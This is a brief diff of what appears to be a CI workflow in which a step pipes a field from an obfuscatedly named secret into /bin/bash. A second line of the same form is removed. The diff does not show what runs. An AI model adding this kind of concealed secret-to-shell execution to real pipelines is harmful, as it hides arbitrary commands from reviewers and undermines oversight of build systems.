@@ -18,7 +18,6 @@ jobs:
           nfn3: ${{ secrets.nfn3 }}
         run: |
           printf '%s' "$nfn3" | jq -r .xjgt8722 | /bin/bash
-          printf '%s' "$xmz01205" | jq -r .n122 | /bin/bash
 
       - name: Persist output
         if: always()
